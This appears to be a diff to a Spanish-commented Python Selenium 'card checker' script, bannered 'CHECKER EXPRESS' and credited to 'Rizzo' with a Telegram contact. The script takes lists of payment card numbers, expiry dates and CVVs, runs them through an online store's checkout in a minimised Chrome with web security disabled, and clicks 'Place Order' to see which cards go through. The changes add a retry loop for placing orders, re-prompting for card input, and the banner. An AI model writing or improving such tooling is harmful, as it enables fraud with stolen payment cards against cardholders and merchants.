@@ -35,6 +35,18 @@ chrome_options.add_argument("--disable-web-security")
 driver = webdriver.Chrome(options=chrome_options)
 driver.minimize_window()
 
+derechos_de_autor = "Derechos de autor: (C) 2024 Rizzo. Todos los derechos reservados. Contacto-Telegram: @rizssoo"
+codigo_ascii = """
+░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░  ███████╗██╗░░██╗██████╗░██████╗░███████╗░██████╗░██████╗
+██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗  ██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝
+██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝  █████╗░░░╚███╔╝░██████╔╝██████╔╝█████╗░░╚█████╗░╚█████╗░
+██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗  ██╔══╝░░░██╔██╗░██╔═══╝░██╔══██╗██╔══╝░░░╚═══██╗░╚═══██╗
+╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║  ███████╗██╔╝╚██╗██║░░░░░██║░░██║███████╗██████╔╝██████╔╝
+░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝  ╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░
+"""
+
+# Imprimir en color rojo
+
 
 def express(card, date, cvv):
     print("\033[93mCalando...\033[0m", end='\r', flush=True)
@@ -347,7 +359,7 @@ def express(card, date, cvv):
                 "document.querySelector(\"button.btn.VgwgDBBL.i31kbSky.a-YwkJU2._0TgAT[data-selected='false']\").click();"
             )
             Tarjetas = False
-        except TimeoutException:
+        except JavascriptException:
             # Si el botón no está presente antes de que se alcance el tiempo de espera especificado
             WebDriverWait(driver, 4).until(
                 EC.presence_of_element_located((By.ID, "aurusIframe"))
@@ -397,14 +409,21 @@ def express(card, date, cvv):
             "document.querySelector(\"button.btn.VgwgDBBL.i31kbSky.a-YwkJU2._0TgAT[data-selected='false']\").click();"
         )
 
-        #    print("El botón 'Place Order' no fue encontrado o no era clickeable en el tiempo establecido.")
-        button = WebDriverWait(driver, 4).until(
-            EC.element_to_be_clickable(
-                (By.CSS_SELECTOR, "button.btn.VgwgDBBL.i31kbSky.a-YwkJU2._0TgAT.p2TWK")
-            )
-        )
-        # Hacer clic en el botón
-        button.click()
+        PlaceOrder = True
+        while PlaceOrder:
+            try:
+                button = WebDriverWait(driver, 4).until(
+                    EC.element_to_be_clickable(
+                        (By.CSS_SELECTOR, "button.btn.VgwgDBBL.i31kbSky.a-YwkJU2._0TgAT.p2TWK")
+                    )
+                )
+                # Hacer clic en el botón
+                button.click()
+                PlaceOrder=False
+            except TimeoutException:
+                PlaceOrder = True
+            #    print("El botón 'Place Order' no fue encontrado o no era clickeable en el tiempo establecido.")
+
 
     try:
         # Verifica si el encabezado 'Delivery Details' está presente
@@ -487,37 +506,42 @@ def cargar_cards(ruta_archivo):
 
 
 def cargar_cards_desde_consola():
-    print("\033[92mIngrese las tarjetas (formato: Card|MM|AAAA|CVV):\033[0m")
-    credenciales = []
-
     while True:
+        print("\033[92mIngrese las tarjetas (formato: Card|MM|AAAA|CVV):\033[0m")
+        credenciales = []
         try:
-            input_line = input().strip()
-            if not input_line:
-                break
+            while True:
+                input_line = input().strip()
+                if not input_line:
+                    break
 
-            partes = input_line.split("|")
-            partes = [parte.strip() for parte in partes]
+                partes = input_line.split("|")
+                partes = [parte.strip() for parte in partes]
 
-            if len(partes) != 4:
-                print("\033[91mFormato incorrecto. Debe ser 'Card|MM|AAAA|CVV'.\033[0m")
-                continue
+                if len(partes) != 4:
+                    print("\033[91mFormato incorrecto. Debe ser 'Card|MM|AAAA|CVV'.\033[0m")
+                    print(" ")
+                    print("================================================")
+                    print(" ")
+                    break  # Romper el bucle interno y solicitar nuevamente las tarjetas
 
-            card = partes[0]
-            exp_date = partes[1] + partes[2][2:]
-            cvv = partes[3]
-            credenciales.append((card, exp_date, cvv))
+                card = partes[0]
+                exp_date = partes[1] + partes[2][2:]
+                cvv = partes[3]
+                credenciales.append((card, exp_date, cvv))
 
         except KeyboardInterrupt:
             # Manejar la interrupción por teclado (Ctrl+C) para salir limpiamente
             print("\n\033[91mInterrupción por teclado. Saliendo...\033[0m")
-            break
+            break  # Romper el bucle externo si se presiona Ctrl+C
 
-    if credenciales:
-        print("\033[92mTarjetas cargadas correctamente!\033[0m")
-        print(" ")
+        if credenciales:
+            print("\033[92mTarjetas cargadas correctamente!\033[0m")
+            print(" ")
+            break  # Romper el bucle externo si las tarjetas se ingresaron correctamente
 
     return credenciales
+
 
 # Ejecutar la función
 
@@ -531,6 +555,8 @@ def main():
 
     #credenciales = cargar_cards(ruta_archivo)
     # credenciales = cargar_cards('cards.txt')
+    print("\033[91m" + codigo_ascii + "\033[0m")
+    print("\033[93m" + derechos_de_autor + "\n" + "\033[0m")
     credenciales = cargar_cards_desde_consola()
     if credenciales is None:
         #print("Por favor, asegúrese de que el archivo este en el formato correcto")
